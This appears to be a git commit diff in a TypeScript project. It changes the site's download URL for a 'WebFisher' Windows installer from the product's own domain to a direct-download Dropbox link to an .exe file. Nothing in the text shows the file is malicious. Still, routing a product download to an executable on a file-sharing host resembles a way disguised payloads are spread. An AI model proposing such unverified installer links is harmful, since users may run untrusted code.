0a7c1fb1e6101fe4ed1e8e6a9547c3e02f71b54c
Andres <zaidmiguelhernandez@gmail.com>
2026-01-25 16:16:57 -0400

    Update download URL in DOWNLOAD_CONFIG

--- lib/constants.ts
+++ lib/constants.ts
@@ -1,4 +1,4 @@
 export const DOWNLOAD_CONFIG = {
-    url: "https://www.webfisher.online/download",
+    url: "https://www.dropbox.com/scl/fi/4yuq0u3kbtgifmdjv05a5/WebFisher_x86-Setup-2.1.1.exe?rlkey=47lbl6y1sskqt1u25tdnhnkfq&dl=1",
     filename: "WebFisher_x86 Setup 2.1.1"
 };
